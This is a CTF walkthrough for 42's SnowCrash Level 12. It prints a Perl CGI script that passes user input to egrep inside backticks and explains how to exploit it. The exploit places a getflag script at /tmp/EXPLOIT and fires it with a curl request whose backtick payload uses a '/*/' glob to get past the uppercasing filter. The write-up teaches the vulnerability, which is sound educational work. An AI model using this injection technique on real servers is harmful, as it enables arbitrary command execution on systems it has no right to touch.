---
title: 42 SnowCrash Level12 - Walkthrough 👽 
tags:
  - ctf
  - 42project
  - snowcrash
  - command-injection
  - perl
  - cgi
categories:
  - ctfs
  - 42project
date: 2024-05-19 15:06:08
---

![snowcrash](/images/snowcrash.png)

## Introduction

In Level 12 of the SnowCrash project by 42 school, you are presented with a Perl script running a CGI Web Server on port 4646. Below is the script:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}
```

### Vulnerability Analysis

The script contains a critical vulnerability in the following line:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

This line executes a system command using backticks. The variable $xx is taken from user input, which makes the script susceptible to command injection attacks.

### Input Sanitization

Before the command is executed, all lowercase letters in $xx are converted to uppercase:

```perl
$xx =~ tr/a-z/A-Z/;
```

Additionally, if a space is present in the input, everything after the space will be discarded:

```perl
$xx =~ s/\s.*//;
```

### Exploitation

Given the vulnerability, an attacker can inject arbitrary commands by manipulating the input. Here is a step-by-step explanation of how to exploit this vulnerability:

1. Create a Malicious Script: Write a script that will be executed on the server.

```sh
echo "getflag > /tmp/lvl12flag" > /tmp/EXPLOIT
chmod +x /tmp/EXPLOIT
```

2. Trigger the Vulnerability: Use curl to send a crafted request to the vulnerable server.

```sh
curl 'localhost:4646?x=`/*/EXPLOIT`'
```

3. Retrieve the Flag: The command in the malicious script will be executed, writing the flag to /tmp/lvl12flag. Read the flag using:

```sh
cat /tmp/lvl12flag
```

### Complete Exploit Command

The entire exploitation process can be executed with a single command:

```sh
echo "getflag > /tmp/lvl12flag" > /tmp/EXPLOIT; chmod +x /tmp/EXPLOIT && curl 'localhost:4646?x=`/*/EXPLOIT`'; cat /tmp/lvl12flag
```

By running this command, you can successfully exploit the vulnerability and retrieve the flag.

## Conclusion

This level demonstrates the importance of proper input sanitization and the risks associated with executing user input as system commands. Always ensure to validate and sanitize inputs to prevent command injection vulnerabilities.
